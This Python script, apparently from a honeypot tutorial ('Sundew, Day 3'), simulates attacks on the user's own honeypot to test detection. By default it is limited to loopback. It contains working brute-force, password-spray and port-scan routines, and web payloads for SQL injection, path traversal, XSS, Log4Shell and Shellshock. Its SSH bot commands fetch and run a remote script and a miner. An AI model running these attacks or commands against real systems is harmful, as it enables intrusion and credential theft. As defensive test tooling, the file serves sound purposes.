#!/usr/bin/env python3
"""Sundew - Day 3: attack simulator.

Attacks YOUR OWN honeypot so you can test detection and fill the dashboard.
It refuses to target anything except loopback unless you pass --i-own-this-host.

Examples:
    python simulator.py scan
    python simulator.py ssh-brute ftp-brute --sources 4
    python simulator.py web
    python simulator.py all --sources 6

With --sources N the simulator connects FROM 127.0.0.2, 127.0.0.3, ... so the
honeypot sees several different attacker IPs (Linux treats all of 127.0.0.0/8
as loopback, so this works with no setup).
"""
import argparse
import ipaddress
import logging
import random
import socket
import sys
import time

import paramiko

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

PORTS = {"ftp": 2121, "http": 8080, "ssh": 2222}

USERS = ["root", "admin", "user", "test", "ubuntu", "oracle", "postgres",
         "pi", "ftpuser", "guest"]
PASSWORDS = ["123456", "password", "admin", "root", "12345", "qwerty", "toor",
             "raspberry", "default", "letmein", "changeme", "1234", "admin123",
             "welcome", "P@ssw0rd"]

USER_AGENTS = ["curl/8.0.1", "python-requests/2.31.0", "Go-http-client/1.1",
               "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
               "Nikto/2.5.0", "sqlmap/1.7.2#stable", "zgrab/0.x", ""]

WEB_PATHS = ["/", "/robots.txt", "/admin", "/login", "/phpmyadmin/",
             "/wp-login.php", "/xmlrpc.php", "/.env", "/.git/config",
             "/backup.zip", "/config.json", "/cgi-bin/test.cgi",
             "/actuator/env", "/manager/html"]

WEB_PAYLOADS = [
    "/?id=1%27%20OR%201%3D1--",
    "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
    "/?q=1%27%3B%20SELECT%20SLEEP(5)--",
    "/?page=../../../../etc/passwd",
    "/..%2f..%2f..%2fetc%2fpasswd",
    "/?name=%3Cscript%3Ealert(1)%3C/script%3E",
    "/?cmd=%3Bcat%20/etc/passwd",
    "/?x=%24%7Bjndi:ldap://203.0.113.9/a%7D",
]

SSH_BOT_COMMANDS = [
    "uname -a",
    "whoami",
    "cat /etc/passwd",
    "cd /tmp; wget http://198.51.100.23/bot.sh -O- | sh",
    "curl -O http://198.51.100.23/miner; chmod +x miner",
    "history -c",
]

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 2121, 2222,
                3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9200]


# ---------- safety ----------
def check_target(host, allowed_remote):
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
    except OSError:
        sys.exit(f"Cannot resolve {host}")
    if ip.is_loopback:
        return
    if not allowed_remote:
        sys.exit(f"Refusing to attack {host} ({ip}): not loopback.\n"
                 "Only attack machines you own. If it is your own VM, add --i-own-this-host.")
    print(f"[!] Attacking non-local host {host} ({ip}). Make sure it is yours.")


# ---------- helpers ----------
def open_conn(host, port, src):
    return socket.create_connection((host, port), timeout=5,
                                    source_address=(src, 0) if src else None)


def label(src):
    return src or "default-ip"


# ---------- scenarios ----------
def scan(args, sources):
    """Port scan: connect to many ports, send nothing (like nmap -sT)."""
    print("[*] scan")
    for src in sources:
        open_ports = []
        for port in COMMON_PORTS:
            s = socket.socket()
            s.settimeout(0.4)
            try:
                if src:
                    s.bind((src, 0))
                if s.connect_ex((args.host, port)) == 0:
                    open_ports.append(port)
            finally:
                s.close()
            time.sleep(args.delay)
        print(f"    {label(src)}: open ports {open_ports}")


def ftp_brute(args, sources):
    print("[*] ftp-brute")
    for src in sources:
        user = random.choice(USERS)
        pairs = [(user, pw) for pw in random.sample(PASSWORDS, min(args.attempts, len(PASSWORDS)))]
        pairs.append(("anonymous", "guest@example.com"))
        try:
            s = open_conn(args.host, args.ftp_port, src)
            f = s.makefile("rb")
            f.readline()
            for u, p in pairs:
                s.sendall(f"USER {u}\r\n".encode()); f.readline()
                s.sendall(f"PASS {p}\r\n".encode()); f.readline()
                time.sleep(args.delay)
            s.sendall(b"SYST\r\n"); f.readline()
            s.sendall(b"QUIT\r\n"); f.readline()
            f.close(); s.close()
            print(f"    {label(src)}: {len(pairs)} FTP logins tried as {user}")
        except OSError as exc:
            print(f"    {label(src)}: error {exc}")


def http_request(args, src, method, path, headers=None, body=b""):
    h = {"Host": args.host, "Connection": "close", "User-Agent": "curl/8.0.1"}
    h.update(headers or {})
    if body:
        h["Content-Length"] = str(len(body))
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    req = f"{method} {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in h.items()) + "\r\n"
    s = open_conn(args.host, args.http_port, src)
    try:
        s.sendall(req.encode() + body)
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        return data.split(b" ", 2)[1].decode() if data.startswith(b"HTTP/") else "?"
    finally:
        s.close()


def http_brute(args, sources):
    print("[*] http-brute (one user, many passwords)")
    for src in sources:
        user = random.choice(USERS)
        n = 0
        for pw in random.sample(PASSWORDS, min(args.attempts, len(PASSWORDS))):
            body = f"username={user}&password={pw}".encode()
            try:
                http_request(args, src, "POST", "/login", body=body)
                n += 1
            except OSError:
                pass
            time.sleep(args.delay)
        print(f"    {label(src)}: {n} web logins tried as {user}")


def spray(args, sources):
    print("[*] spray (one password, many users)")
    for src in sources:
        n = 0
        for user in USERS:
            body = f"username={user}&password=Winter2026!".encode()
            try:
                http_request(args, src, "POST", "/login", body=body)
                n += 1
            except OSError:
                pass
            time.sleep(args.delay)
        print(f"    {label(src)}: sprayed {n} usernames")


def web(args, sources):
    print("[*] web (path probing + attack strings)")
    for src in sources:
        n = 0
        for path in WEB_PATHS:
            ua = random.choice(USER_AGENTS)
            try:
                http_request(args, src, "GET", path, headers={"User-Agent": ua})
                n += 1
            except OSError:
                pass
            time.sleep(args.delay)
        for path in WEB_PAYLOADS:
            try:
                http_request(args, src, "GET", path,
                             headers={"User-Agent": random.choice(["sqlmap/1.7.2#stable", "curl/8.0.1", "Nikto/2.5.0"])})
                n += 1
            except OSError:
                pass
            time.sleep(args.delay)
        # Shellshock-style header against a CGI path
        try:
            http_request(args, src, "GET", "/cgi-bin/test.cgi",
                         headers={"User-Agent": "() { :;}; echo vulnerable"})
            n += 1
        except OSError:
            pass
        print(f"    {label(src)}: {n} web requests")


def ssh_attempt(args, src, user, pw, commands=None):
    """One SSH login attempt. Returns True if accepted. Runs commands if given."""
    try:
        sock = open_conn(args.host, args.ssh_port, src)
    except OSError:
        return False
    t = paramiko.Transport(sock)
    try:
        t.start_client(timeout=10)
        try:
            t.auth_password(user, pw)
        except paramiko.AuthenticationException:
            return False
        if commands:
            chan = t.open_session(timeout=10)
            chan.get_pty()
            chan.invoke_shell()
            chan.settimeout(1.0)
            time.sleep(0.3)
            for cmd in commands + ["exit"]:
                try:
                    chan.recv(4096)
                except socket.timeout:
                    pass
                chan.send(cmd + "\n")
                time.sleep(0.2)
        return True
    except (paramiko.SSHException, OSError, EOFError):
        return False
    finally:
        t.close()


def ssh_brute(args, sources, with_session=False):
    print("[*] ssh-session" if with_session else "[*] ssh-brute")
    for src in sources:
        user = random.choice(["root", "admin", "ubuntu"])
        tried, accepted = 0, False
        for pw in random.sample(PASSWORDS, min(args.attempts, len(PASSWORDS))):
            tried += 1
            if ssh_attempt(args, src, user, pw, SSH_BOT_COMMANDS if with_session else None):
                accepted = True
                break
            time.sleep(args.delay)
        print(f"    {label(src)}: {tried} SSH attempts as {user}, "
              f"{'ACCEPTED' if accepted else 'never accepted'}")


SCENARIOS = {
    "scan": scan,
    "ftp-brute": ftp_brute,
    "http-brute": http_brute,
    "spray": spray,
    "web": web,
    "ssh-brute": lambda a, s: ssh_brute(a, s, False),
    "ssh-session": lambda a, s: ssh_brute(a, s, True),
}


def main():
    p = argparse.ArgumentParser(description="Sundew attack simulator (own systems only)")
    p.add_argument("scenarios", nargs="+", choices=list(SCENARIOS) + ["all"])
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--ftp-port", type=int, default=PORTS["ftp"])
    p.add_argument("--http-port", type=int, default=PORTS["http"])
    p.add_argument("--ssh-port", type=int, default=PORTS["ssh"])
    p.add_argument("--sources", type=int, default=0,
                   help="simulate N attacker IPs (127.0.0.2...) when targeting loopback")
    p.add_argument("--attempts", type=int, default=6, help="password attempts per source")
    p.add_argument("--delay", type=float, default=0.05, help="seconds between attempts")
    p.add_argument("--i-own-this-host", action="store_true",
                   help="required to attack anything that is not loopback")
    args = p.parse_args()

    check_target(args.host, args.i_own_this_host)

    if args.sources > 0:
        if not ipaddress.ip_address(socket.gethostbyname(args.host)).is_loopback:
            sys.exit("--sources only works against loopback targets")
        sources = [f"127.0.0.{i + 2}" for i in range(min(args.sources, 200))]
    else:
        sources = [None]

    chosen = list(SCENARIOS) if "all" in args.scenarios else args.scenarios
    for name in chosen:
        SCENARIOS[name](args, sources)
    print("[*] done")


if __name__ == "__main__":
    main()
